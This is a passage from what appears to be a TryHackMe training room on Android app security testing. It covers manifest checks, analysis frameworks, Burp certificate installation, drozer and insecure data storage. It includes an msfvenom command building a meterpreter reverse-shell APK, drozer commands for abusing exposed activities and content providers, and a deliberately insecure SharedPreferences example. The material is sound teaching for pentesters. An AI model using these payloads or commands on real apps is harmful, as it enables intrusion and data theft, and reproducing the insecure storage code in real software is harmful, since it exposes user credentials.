src="https://1.bp.blogspot.com/-Wj7holsJkQo/XbiEIYOYyoI/AAAAAAAAAQU/U5EbQHdSgKkRhvLtwq3Yf07dEAaRn28VACLcBGAsYHQ/s1600/de1.png" style="width:1046.04px" /><span style="font-size:1rem"><br /></span></p><p style="margin-bottom:1rem"><span style="font-size:1rem">Real scenario? you use your mind for this exercice :3.</span><span style="background-color:rgb(234, 234, 237)"><span style="font-size:14px;white-space:pre"><br /></span></span></p></div><p><span style="font-weight:bolder">Solution</span>:\xa0android:allowBackup="false"<br /></p><p><b><span style="font-size:24px">Apps which are debuggable</span></b>:\xa0Debugging was enabled on the app which makes it easier for reverse engineers to hook a debugger to it. This allows dumping a stack trace and accessing debugging helper classes.</p><div><p style="margin-bottom:1rem">How identify this<span style="font-size:1rem">?</span></p></div><div><p style="margin-bottom:1rem">With your favorite editor of text.\xa0Gedit/Vim/subl, etc…\xa0open the\xa0AndroidManifest.xml or use cat and grep.</p><p style="margin-bottom:1rem"><img src="https://1.bp.blogspot.com/-KHoR5T1AJas/XbiHFunF5BI/AAAAAAAAARA/4WOeB39otdo4xwn4s6Jrh3dtjBfb9RQ5ACLcBGAsYHQ/s400/debug.png" style="width:215.99px" /></p><p style="margin-bottom:1rem"><span style="background-color:rgb(234, 234, 237)"><span style="font-size:14px;white-space:pre">cat AndroidManifest.xml | grep "android:debuggable" --color</span></span><br /></p><p style="margin-bottom:1rem"><img src="https://1.bp.blogspot.com/-TYOiTUc9mJ0/XbiHFiesGGI/AAAAAAAAAQ8/v3-HskZIa1ghyYbXXGLNoVNRs_kCs3pqACLcBGAsYHQ/s1600/debug1.png" style="width:1046.04px" /></p><p>Example in dynamic analysis, byee!<br /></p><p><span style="font-size:24px">App Permissions</span>:\xa0System permissions are divided into two groups: “normal” and “dangerous.” Normal permission groups are allowed by default, because they don’t pose a risk to your privacy. (e.g., Android allows apps to access the Internet without your permission.) Dangerous permission groups, however, can give apps access to things like your calling history, private messages, location, camera, microphone, and more. Therefore, Android will always ask you to approve dangerous permissions.</p><p>In earlier versions of Android, accepting potentially dangerous permission groups was an all-or-nothing affair. You either allowed all permissions an app needed to function — before installation — or you declined them all, which meant you couldn’t install the app.</p><p style="margin-bottom:1rem">I going to analyze the permissions of an apk app generated by metasploit. </p><p style="margin-bottom:1rem"><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R &gt; /root/tryhackme.apk</code></p><p style="margin-bottom:1rem">Okay, HOW?</p><p style="margin-bottom:1rem">With your favorite editor of text.\xa0Gedit/Vim/subl, etc…\xa0open the\xa0AndroidManifest.xml or use cat and grep.</p></div><div><img src="https://1.bp.blogspot.com/-IV0Uqlf_wz4/XbiMJuS515I/AAAAAAAAARg/XTXDRd6aSE4oONb_GgV7pJzpDUjJ11TugCLcBGAsYHQ/s1600/Screenshot_10.png" style="width:854.983px" /></div><div><br /></div><p><b><span style="font-size:24px">Firebase Instance(s)</span></b>:\xa0Last year, security researchers have discovered <a href="https://cdn2.hubspot.net/hubfs/436053/Appthority%20Q2-2018%20MTR%20Unsecured%20Firebase%20Databases.pdf">unprotected Firebase databases</a> of thousands of iOS and Android mobile applications that are exposing over 100 million data records, including plain text passwords, user IDs, location, and in some cases, financial financial records such as banking and cryptocurrency transactions.</p><p>Google\'s Firebase service is one of the most popular back-end development platforms for mobile and web applications that offers developers a cloud-based database, which stores data in JSON format and synced it in the real-time with all connected clients.</p><p>How identify this<span style="font-size:1rem">?\xa0</span></p><p><a href="https://github.com/shivsahni/FireBaseScanner">FireBase Scanner</a>,\xa0The scripts helps security analsts to identify misconfigured firebase instances.</p><p><code>git clone\xa0https://github.com/shivsahni/FireBaseScanner</code><a href="https://github.com/shivsahni/FireBaseScanner"></a></p><p><code>python\xa0FireBaseScanner.py -p /path/apk</code></p><p><img src="https://1.bp.blogspot.com/-JDtQJaiNp0c/XbiPgj67CTI/AAAAAAAAAR4/bKu3PRMK6NomtBULj5fZX0q4wK-lRaOVgCLcBGAsYHQ/s1600/Screenshot_11.png" style="width:1035px" /><br /></p><p><span style="font-size:24px">Sensitive data in the code</span>: Users, passwords, internal IP and more ...\xa0</p><p><span style="font-size:1rem">With your favorite editor of text, Gedit/Vim/subl, etc…, grep or GUI decompiler back to reversing and experiment with your favorite tool.</span></p><div><img src="https://4.bp.blogspot.com/-xgR8721Tphc/Vte4yhXgKiI/AAAAAAAADFQ/o2GFxx2Z5HY/s1600/8.png" style="width:864.983px" /><span style="font-size:1rem"><br /></span></div><div><span style="font-size:1rem"><br /></span></div><div><img src="https://1.bp.blogspot.com/-hxEUI02aPP0/Vte4yl7DwnI/AAAAAAAADFU/HHrSESM707I/s1600/9.png" style="width:670.99px" /><span style="font-size:1rem"><br /></span></div><div><span style="font-size:1rem"><br /></span></div><div>In the real life exist very bad practice of programing! how example:\xa0</div><div><br /></div><div><img src="https://1.bp.blogspot.com/-ymnbXUSE22I/XbiSbUcIZtI/AAAAAAAAASU/tinVGFFDUDouWxux4kvBBNrH6l2wrST7QCLcBGAsYHQ/s1600/passwd1.png" style="width:943.993px" /></div><div><br /></div><div><img src="https://1.bp.blogspot.com/-cHNrZD1n1TM/XbiSbKJPIHI/AAAAAAAAASQ/rjyum-32sYEG2rT0NPS-usYvA6TPLNTjwCLcBGAsYHQ/s1600/passwd2.png" style="width:710.99px" /><br /></div><div><br /></div><div><img src="https://1.bp.blogspot.com/-8zyh4vgKkg4/XbiSbtIcx6I/AAAAAAAAASY/ssRegTHdx30nMwM2fgzeZpwavVLGYyPOwCLcBGAsYHQ/s1600/passwd3.png" style="width:1005px" /></div><div><br /></div><div><img src="https://1.bp.blogspot.com/-P_tna-v9frM/XbiSbrweFhI/AAAAAAAAASc/e0NnSUxp6OEXuY5CVJMDJHl3RAsjp024gCLcBGAsYHQ/s1600/passwd.png" style="width:1007px" /><br /></div><div><br /></div><div><span style="font-size:24px"><b>How to automatize this process?</b></span></div><div><br /></div><div>It is very entertaining to do this manually, but in a real pentest the time is not our friend.<br /></div><div><br /></div><div style="text-align:center"><span style="font-size:36px;font-family:Calibri;font-variant-numeric:normal;font-variant-east-asian:normal;color:rgb(0, 176, 80);text-transform:uppercase;font-weight:bold;vertical-align:baseline">Static analysis – Frameworks</span><br /></div><div style="text-align:center"><br /></div><div><div><a href="https://github.com/xtiankisutsa/MARA_Framework"><span style="font-size:24px">MARA Framework</span></a><span style="font-size:24px">:</span></div><div><br /></div><div>Is a Mobile Application Reverse engineering and Analysis Framework. It is a tool that puts together commonly used mobile application reverse engineering and analysis tools, to assist in testing mobile applications against the OWASP mobile security threats. Its objective is to make this task easier and friendlier to mobile application developers and security professionals.</div></div><div><br /></div><div><div>Features:</div><div><br /></div><div><b>APK Manifest Analysis</b></div><div><br /></div><div>Extract Intents</div><div>Extract exported activities</div><div>Extract receivers</div><div>Extract exported receivers</div><div>Extract Services</div><div>Extract exported services</div><div>Check if apk is debuggable</div><div>Check if apk allows backups</div><div>Check if apk allows sending of secret codes</div><div>Check if apk can receive binary SMS</div><div><br /></div><div><b>Security Analysis</b></div><div><br /></div><div>Source code static analysis based on OWASP Top Mobile Top 10 and the OWASP Mobile Apps Checklist</div><div>MARA is capable of performing either single or mass analysis of apk, dex or jar files.</div><div><br /></div><div>and more....</div><div><br /></div><div><img src="https://web.archive.org/web/20211101125847/https://indiancybersecuritysolutions.com/wp-content/uploads/2018/03/Conclusion.png" style="width:1046.04px" /><br /></div><div><br /></div><div><a href="https://github.com/linkedin/qark"><span style="font-size:24px">QARK</span></a> </div><div><br /></div><div>Is a static code analysis tool, designed to recognize potential security vulnerabilities and points of concern for Java-based Android applications. QARK was designed to be community based, available to everyone and free for use. QARK educates developers and information security personnel about potential risks related to Android application security, providing clear descriptions of issues and links to authoritative reference sources. QARK also attempts to provide dynamically generated ADB (Android Debug Bridge) commands to aid in the validation of potential vulnerabilities it detects. It will even dynamically create a custom-built testing application, in the form of a ready to use APK, designed specifically to demonstrate the potential issues it discovers, whenever possible.”<br /></div><div><br /></div><div><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5cd229fcf8539a4a7a054165/room-content/ac8f8e12d331721f8a5d5e6e1bcea51b.png" style="width:789px;height:253.957px" /><br /></div><div><br /></div><div><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5cd229fcf8539a4a7a054165/room-content/95381c70b7a12c73e04c3d0e90b36097.png" /><br /></div><div><br /></div><div><br /></div><div><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-documentation"><span style="font-size:24px">MobSF</span></a><br /></div><div><br /></div><div>My favorite tool :3 is Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis.<br /></div><div><br /></div><div style="text-align:center"><img src="https://www.welivesecurity.com/wp-content/uploads/2016/12/img_02.png" style="width:1046.04px" /><br /></div><div><div><br /></div><div>1. <b>Information</b></div><div><br /></div><div>Display data such as app icon, app name, size, package name etc.MD5 &amp; SHA1 are also shown. They can be useful to detect known malicious applications.</div><div><br /></div><div>2. <b>Scan options</b></div><div><b><br /></b></div><div>· Rescan the application</div><div>· Start the dynamic analysis</div><div>· Check the java code &amp; the manifest file</div><div><br /></div><div>3. <b>Signer certificate</b></div><div><b><br /></b></div><div>·Display certificate info</div><div>·Determine if an application has come from its original source.</div><div><br /></div><div>4. <b>Permissions</b></div><div><b><br /></b></div><div>· Analyzes the permissions</div><div>· Determines its status concerning critically &amp; the description of permissions.</div><div><br /></div><div>5. <b>Binary analysis</b></div><div><b><br /></b></div><div>· It is threat assessment &amp; vulnerability testing at the binary code level.</div><div>· It can also be used to analyze third party libraries, allowing a richer analysis &amp; better visibility into how applications will interact with libraries.</div><div>· This is analysis of binary code to identify security issues. For complex systems using third party libraries for which source code is not available binary code analysis helps to identify issues.</div><div><br /></div><div>6. <b>Android API</b></div><div><br /></div><div>You can view android API used in app like java reflection, location.</div><div><br /></div><div>7. <b>Browsable activities</b></div><div><br /></div><div>That can be safely invoked from a browser.</div><div><br /></div><div>8. <b>Security analysis</b></div><div><br /></div><div><b>Manifest analysis:</b></div><div><br /></div><div>Find vulnerability inside one of the components in the AndroidManifest.xml file.</div><div><br /></div><div><b>Code analysis:</b></div><div><br /></div><div>· Analysis result of java code by a static analyzer.</div><div>· Identifies potential vulnerabilities, determines their severity &amp; the files in which this type of vulnerability was found.CVSS :</div><div><br /></div><div>· Common Vulnerability Scoring System</div><div><br /></div><div>· Vulnerability is assigned a CVSS base score between 0.0 &amp; 10.0.</div><div><br /></div><div>0.0 → No risk</div><div>0.1–3.9 → Low risk</div><div>4.0–6.9 → Medium risk</div><div>7.0–8.9 → High risk</div><div>9.0–10.0 → Critical risk score</div><div><br /></div><div>CWE :</div><div><br /></div><div>· Common Weakness Enumeration</div><div>· It is a list of software architecture, design or a code weakness.</div><div><br /></div><div><b>File analysis:</b></div><div><br /></div><div>S<span style="font-size:1rem">hows analysis of files.</span></div><div><br /></div><div>9. <b>Malware analysis</b></div><div><br /></div><div>Determine the functionality, origin &amp; potential impact of a given malware sample such as virus.</div><div><br /></div><div>10. <b>Reconnaissance</b></div><div><br /></div><div><b>URL :</b></div><div><br /></div><div>Display list of URLs, IP addresses &amp; the files in which they are stores or called. Analyzes where the android app sends the data &amp; where it stores the info.</div><div><br /></div><div><b>Emails\xa0</b></div><div><br /></div><div><b>Strings :</b></div><div>· Analyzes the text files that are in the res directory.</div><div>· May contain sensitive data.</div><div><br /></div><div>11. <b>Components</b></div><div><br /></div><div>Display a complete list of components (activity, service, content provider &amp; receiver), imported libraries &amp; files without defining the extension.</div></div></div><p><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;white-space:pre"></span></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2019-10-29T16:33:49.865Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What is the name of the firebase instance in the app Black Hat Europe?</p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>Android-InsecureBankv2 <a href="https://github.com/dineshshetty/Android-InsecureBankv2/blob/master/InsecureBankv2/app/app-debug.apk">debug realease</a>, check this and what activity is not Protected.<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>what is the malicious permissions in the app Android-InsecureBankv2?<br /></p>', 'hint': ''}]}, {'taskTitle': 'Static analysis – Complications', 'taskDesc': '<p style="text-align:center;"><img src="https://miro.medium.com/max/3840/1*lStfNOzD8PRnqzWWCmdVmg.png" style="width:1046.04px;" /><br /></p><p><b>Obfuscate Code:</b></p><p>is the process of modifying an executable so that it is no longer useful to a hacker but remains fully functional. While the process may modify actual method instructions or metadata, it does not alter the output of the program. To be clear, with enough time and effort, almost all code can be reverse engineered. However, on some platforms (such as Java, Android, iOS and .NET) free decompilers can easily reverse-engineer source code from an executable or library in virtually no time and with no effort. Automated code obfuscation makes reverse-engineering a program difficult and economically unfeasible.\xa0</p><div><div><b>Proguard</b>:</div><div><br /></div><div>To obfuscate the code, use the Proguard utility, which makes these actions:</div><div><br /></div><div>\xa0 \xa0 Removes unused variables, classes, methods, and attributes;</div><div>\xa0 \xa0 Eliminates unnecessary instructions;</div><div>\xa0 \xa0 Removes Tutorial information: obfuscate Androiddepuración code;</div><div>\xa0 \xa0 Renames classes, fields, and methods with unlegible names.</div><div><br /></div><div style="text-align:center;"><img src="https://miro.medium.com/max/952/0*-oM7mSUimumf_QGp.png" style="width:951.997px;" /></div><div style="text-align:center;"><br /></div><div style="text-align:left;"><div><b>DEXGUARD</b></div><div><br /></div><div>The enhanced commercial version of Proguard. This tool is capable of implementing the text encryption technique and renaming classes and methods with non-ASCII symbols.</div><div><br /></div><div><img src="https://www.rapidvaluesolutions.com/wp-content/uploads/2017/09/Dexguard-Image2.png" style="width:1046.04px;" /></div><div><br /></div><div style="text-align:center;"><span style="font-size:24px;font-family:Calibri;font-variant-numeric:normal;font-variant-east-asian:normal;color:rgb(0, 176, 80);text-transform:uppercase;font-weight:bold;vertical-align:baseline;">Static analysis – </span><span style="font-size:24px;font-family:Calibri;font-variant-numeric:normal;font-variant-east-asian:normal;color:rgb(0, 176, 80);text-transform:uppercase;font-weight:bold;vertical-align:baseline;">Deobfuscation</span><br /></div><div style="text-align:center;"><br /></div><div><div><b><a href="http://apk-deguard.com/">Deguard</a></b>:\xa0</div><div><br /></div><div>It is based on powerful probabilistic graphical models learned from thousands of open source programs. Using these models, Deguard retrieves important information in Android APK, including method and class names, as well as third-party libraries. Deguard can reveal string decoders and classes that handle sensitive data in Android malware.</div><div><br /></div><div><br /></div></div></div></div>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2019-10-29T20:49:30.356Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p><br /></p>', 'hint': ''}]}, {'taskTitle': 'Dynamic Analysis', 'taskDesc': '<p style="text-align:center"><br /></p><p style="text-align:left"><span style="color:rgba(0, 0, 0, 0.75);font-family:&quot;Source Serif Pro&quot;, serif;font-size:20px">is done running the program,\xa0</span></p><p style="text-align:left"><span style="color:rgba(0, 0, 0, 0.75);font-family:&quot;Source Serif Pro&quot;, serif;font-size:20px">How install applications with adb?</span></p><p style="text-align:left"><code>adb install apkfilename.apk</code><span style="color:rgba(0, 0, 0, 0.75);font-family:&quot;Source Serif Pro&quot;, serif;font-size:20px"><br /></span></p><p style="text-align:left"><span style="color:rgba(0, 0, 0, 0.75);font-family:&quot;Source Serif Pro&quot;, serif;font-size:20px">okay, now how intercept traffic of the application?<br /></span></p><p style="text-align:left"><span style="color:rgba(0, 0, 0, 0.75);font-family:&quot;Source Serif Pro&quot;, serif;font-size:20px">Burp Suite:\xa0</span>Is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application’s attack surface, through to finding and exploiting security vulnerabilities.</p><p style="margin-bottom:1rem"><span style="font-size:20px;color:rgba(0, 0, 0, 0.75);font-family:&quot;Source Serif Pro&quot;, serif"><a href="https://support.portswigger.net/customer/portal/articles/1841101-configuring-an-android-device-to-work-with-burp">Configure the Burp Proxy listener</a></span></p><div><span style="color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;;font-size:1rem">Installing trusted CA at the Android OS level (Root device/Emulator) for Android N+ as the following:</span></div><div><br /></div><div><p><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1</code></p><p style="margin-top:0.25em"><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">cat BurpCA.pem &gt; 9a5ba580.0</code></p><p style="margin-top:0.25em"><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">openssl x509 -inform PEM -text -in BurpCA.pem -out /dev/null &gt;&gt; 9a5ba580.0</code></p><p style="margin-top:0.25em"><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">adb root</code></p><p style="margin-top:0.25em"><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">abd remount</code></p><p style="margin-top:0.25em"><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">adb push 9a5ba580.0 /system/etc/security/cacerts/</code></p><p style="margin-top:0.25em"><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">adb shell "chmod 644 /system/etc/security/cacerts/9a5ba580.0"</code></p><p style="margin-top:0.25em;margin-bottom:1rem"><code style="font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;padding:0.2em 0.4em;background-color:rgba(27, 31, 35, 0.05);border-radius:3px;margin:0px">adb shell "reboot" </code></p></div><p><img src="https://i0.wp.com/www.versionestabile.it/blog/wp-content/uploads/2017/10/Screen-Shot-2017-10-03-at-17.30.00.png" style="width:1046.04px" /><br /></p><p><br /></p><p></p><ul></ul><p><span style="font-weight:bolder"><span style="font-size:24px"><a href="https://github.com/JakeWharton/pidcat">PID Cat</a></span></span></p><p>Tool for\xa0<span style="color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">shows log entries for a specific application package when debug=true is enable in the app.</span></p><p></p><p><img src="https://github.com/JakeWharton/pidcat/raw/master/screen.png" style="width:1046.04px" /><span style="color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;"><br /></span><a href="https://github.com/FSecureLABS/drozer"><span style="font-size:24px">Drozer</span></a></p><p>drozer helps to provide confidence that Android apps and devices being developed by, or deployed across, your organisation do not pose an unacceptable level of risk. By allowing you to interact with the Dalvik VM, other apps’ IPC endpoints and the underlying OS.</p><p>drozer provides tools to help you use and share public exploits for Android. For remote exploits, it can generate shellcode to help you to deploy the drozer Agent as a remote administrator tool, with maximum leverage on the device.</p><p>drozer is a comprehensive security audit and attack framework for Android.<br /></p><p>Basic example, Abusing unprotected activities:</p><p>The requirement for this is you have install drozer in your computer and drozer agent in your emulator or devices. Click in the title, for the tutorial of how install...</p><p>Commands:</p><p><code>adb forward tcp:31415 tcp:31415</code><span style="color:rgb(36, 41, 46);font-family:SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:13.6px;background-color:rgba(27, 31, 35, 0.05)"></span></p><p><code>drozer console connect</code><span style="background-color:rgba(27, 31, 35, 0.05)"><span style="font-size:13.6px"></span><br /></span></p><p>Now download and install <a href="https://github.com/as0ler/Android-Examples/raw/master/sieve.apk">apk</a> for this example</p><p><img src="https://1.bp.blogspot.com/-gsDR47x_3dM/XbmxvRPEWuI/AAAAAAAAATU/alGUO8pabwQqOxMH4f15JsjpRSqu5YXIACLcBGAsYHQ/s1600/dro1.png" style="width:388.984px" /><br /></p><p>Retrieving package information:</p><p><code>run app.package.list -&gt;\xa0see all the packages installed</code><br /></p><p><img src="https://1.bp.blogspot.com/-hZEQXTuaEsk/XbmxuztqE-I/AAAAAAAAATM/UHQb8TeBs0cceAuuEufxW67X5M6Nw372ACLcBGAsYHQ/s1600/dro2.png" style="width:443.984px" /><br /></p><p><code>run app.package.info -a  -&gt; view package information.</code></p><p><img src="https://1.bp.blogspot.com/-cH4fQR_g_xI/Xbmxu1LTiGI/AAAAAAAAATI/PvGJ7n3OHs4W9dTkHhWqkEsjpX1d6gk-wCLcBGAsYHQ/s1600/dro3.png" style="width:488.965px" /><br /></p><p>Identifying the attack surface -&gt; activities unprotected and more....<br /></p><p><code>run app.package.attacksurface package_name</code><br /></p><p><img src="https://1.bp.blogspot.com/-OdHlf3BwLdw/XbmxvaddpnI/AAAAAAAAATQ/fOzZhtJxUEwFvFo-ztRvNO16AFdM_jgIACLcBGAsYHQ/s1600/dro4.png" style="width:485.996px" /><br /></p><p>view what activities can be exploited.<br /></p><p><code>run app.activity.info -f package_name</code><br /></p><p><img src="https://1.bp.blogspot.com/-ISiTx7LIdsA/XbmxvoN4j3I/AAAAAAAAATY/2693VgbHP4En7MN6w5KrvtSoNsL5NF1hgCLcBGAsYHQ/s1600/dro5.png" style="width:477.988px" /><br /></p><p>start\xa0<span style="font-size:1rem">activities</span><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">unprotected</span><span style="font-size:1rem">\xa0!</span></p><p><code>run app.activity.start --component package name component_name</code></p><p><img src="https://1.bp.blogspot.com/-lYaJXJeIUVo/XbmxwID1-2I/AAAAAAAAATc/vKPPlYFLq84n74PxuUP4USCKA1UvUYYVACLcBGAsYHQ/s1600/dro6.png" style="width:1046.02px" /><br /></p><p><b><span style="font-size:18px">Basic Cheatsheet of Drozer</span></b></p><p>Exploiting Content Provider</p><p><code>run app.provider.info -a package_name</code></p><p><code>run scanner.provider.finduris -a package_name</code></p><p><code>run app.provider.query uri</code></p><p><code>run app.provider.update uri --selection conditions selection_arg column data</code></p><p><code>run scanner.provider.sqltables -a package_name</code></p><p><code>run scanner.provider.injection -a package_name</code></p><p><code>run scanner.provider.traversal -a package_name</code></p><p>Exploiting Service</p><p><code>run app.service.info -a package_name</code></p><p><code>run app.service.start --action action --component package_name component_name</code></p><p><code>run app.service.send package_name component_name --msg what arg1 arg2 --extra type key value --bundle-as-obj</code></p><p><b><span style="font-size:36px">Inspeckage - Android Package Inspector</span></b><br /></p><p>My favorite tool,\xa0Inspeckage is a tool developed to offer dynamic analysis of Android applications. By applying hooks to functions of the Android API, Inspeckage will help you understand what an Android application is doing at runtime. Inspeckage will let you interact with some elements of the app, such as activities and providers (even unexported ones), and apply some settings on Android.</p><p>Since dynamic analysis of Android applications (usually through hooks) is a core part of several mobile application security tests, the need of a tool that can help us do said tests is real. Even though there are other tools that promise to help you do that, I’ve run across some limitations when testing them:</p><ul><li>Lack of interaction with the user doing the tests;</li><li>Only work in emulators;</li><li>Plenty of time to update the tool after an Android update;</li><li>Very poor output;</li><li>Very costly setup.</li></ul><p><b>Android Package Inspector Features</b></p><p>With Inspeckage, we can get a good amount of information about the application’s behavior:</p><p><b>Information gathering</b></p><ul><li>Requested Permissions;</li><li>App Permissions;</li><li>Shared Libraries;</li><li>Exported and Non-exported Activities, Content Providers,Broadcast Receivers and Services;</li><li>Check if the app is debuggable or not;</li><li>Version, UID and GIDs;</li><li>etc.</li></ul><p><b>Hooks</b></p><p>With the hooks, we can see what the application is doing in real time:</p><ul><li>Shared Preferences (log and file);</li><li>Serialization;</li><li>Crypto;</li><li>Hashes;</li><li>SQLite;</li><li>HTTP (an HTTP proxy tool is still the best alternative);</li><li>File System;</li><li>Miscellaneous (Clipboard, URL.Parse());</li><li>WebView;</li><li>IPC.</li></ul><p>How use:</p><p style="text-align:center"><iframe frameborder="0" width="640" height="360" class="note-video-clip"></iframe><br /></p><p><b>END OF\xa0Dynamic Analysis.</b></p><p><b><span style="font-size:36px">IMPORTANT:</span></b></p><p><b><span style="font-size:36px">Insecure Data Storage</span></b><br /></p><p>We\'ve totally interacted with our app now it\'s time to see the files created locally.</p><p>Many developers assume that storing data on client-side will restrict other users from having access to this data. Interestingly, most of the top mobile application security breaches have been caused by insecure or unnecessary client-side data storage. File systems on devices are no longer a sandboxed environment and rooting or jailbreaking usually circumvents any protections.</p><p>One needs to understand what different types of data are there and how are these stored insecurely.</p><p>Data - Usernames, Authentication tokens or passwords, Cookies, Location data, Stored application logs or Debug information, Cached application messages or transaction history, UDID or EMEI, Personal Information (DoB, Address, Social, etc), Device Name, Network Connection Name, private API calls for high user roles, Credit Card Data or Account Data, etc.</p><p>All apps (root or not) have a default data directory, which is /data/data/&lt;package_name&gt;. By default, the apps databases, settings, and all other data go here.<br /></p><ul><li><b>databases</b>/: here go the app\'s databases</li><li><b>lib</b>/: libraries and helpers for the app</li><li><b>files</b>/: other related files</li><li><b>shared_prefs</b>/: preferences and settings</li><li><b>cache</b>/: well, caches</li></ul><p>For interact with device or emulator\xa0</p><p><code>adb shell</code></p><p>Sqlite database file</p><p>Once you are able to access the SQLite database file on an emulator, rooted device or via adb shell / run as [package name], there are a few options to inspect the schema and your SQLite database on device.</p><p><b><a href="https://sqlitebrowser.org/dl/">Inspect SQLite db via a GUI tool</a></b></p><p>Pull the file from device first, then use a GUI software to look the schema and content. I use SQLite browser which allows you to see the database schema, table content, as well as executing some simple SQL scripts.</p><p><code>adb pull /data/data/package-name/databases/sqlitedatabse</code></p><p><b>Inspect SQLite db via sqlite3 command line tool</b></p><p>For me the easier option is to use sqlite3 command line tool to inspect the database from adb shell.</p><p><code>cd data/data/package-name/databases/</code></p><p><code>sqlite3 db-name</code></p><p><code>.tables</code></p><p><code>.schema table-name</code></p><p>Example in the real life:</p><p><img src="https://1.bp.blogspot.com/-5dkR-xzaA7o/Xbm_8j-FJfI/AAAAAAAAAUE/7e7UeC5OdeYzhi7egq1pLKgr9mT_Zm8ygCLcBGAsYHQ/s1600/shared1.png" style="width:1046.02px" /><br /></p><p><span style="box-sizing:inherit;font-family:medium-content-serif-font, Georgia, Cambria, &quot;Times New Roman&quot;, Times, serif;font-weight:700;color:rgba(0, 0, 0, 0.84);font-size:21px;letter-spacing:-0.084px">Shared Preferences Files</span></p><p>The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world-readable (accessible to all apps) or private. Misuse of the SharedPreferences API can often lead to exposure of sensitive data. Consider the following example:</p><div><pre><span>SharedPreferences</span> sharedPref <span style="color:rgb(215, 58, 73)">=</span> getSharedPreferences(<span style="color:rgb(3, 47, 98)"><span>"</span>key<span>"</span></span>, <span style="color:rgb(0, 92, 197)">MODE_WORLD_READABLE</span>);\n<span>SharedPreferences</span><span style="color:rgb(215, 58, 73)">.</span><span>Editor</span> editor <span style="color:rgb(215, 58, 73)">=</span> sharedPref<span style="color:rgb(215, 58, 73)">.</span>edit();\neditor<span style="color:rgb(215, 58, 73)">.</span>putString(<span style="color:rgb(3, 47, 98)"><span>"</span>username<span>"</span></span>, <span style="color:rgb(3, 47, 98)"><span>"</span>administrator<span>"</span></span>);\neditor<span style="color:rgb(215, 58, 73)">.</span>putString(<span style="color:rgb(3, 47, 98)"><span>"</span>password<span>"</span></span>, <span style="color:rgb(3, 47, 98)"><span>"</span>supersecret<span>"</span></span>);\neditor<span style="color:rgb(215, 58, 73)">.</span>commit();</pre></div><div><br /></div><div>Once the activity has been called, the file key.xml will be created with the provided data. This code violates several best practices.</div><div><br /></div><div><pre>&lt;?<span style="color:rgb(34, 134, 58)">xml</span><span style="color:rgb(111, 66, 193)"> version</span>=<span style="color:rgb(3, 47, 98)"><span>\'</span>1.0<span>\'</span></span><span style="color:rgb(111, 66, 193)"> encoding</span>=<span style="color:rgb(3, 47, 98)"><span>\'</span>utf-8<span>\'</span></span><span style="color:rgb(111, 66, 193)"> standalone</span>=<span style="color:rgb(3, 47, 98)"><span>\'</span>yes<span>\'</span></span> ?&gt;\n&lt;<span style="color:rgb(34, 134, 58)">map</span>&gt;\n  &lt;<span style="color:rgb(34, 134, 58)">string</span> <span style="color:rgb(111, 66, 193)">name</span>=<span style="color:rgb(3, 47, 98)"><span>"</span>username<span>"</span></span>&gt;administrator&lt;/<span style="color:rgb(34, 134, 58)">string</span>&gt;\n  &lt;<span style="color:rgb(34, 134, 58)">string</span> <span style="color:rgb(111, 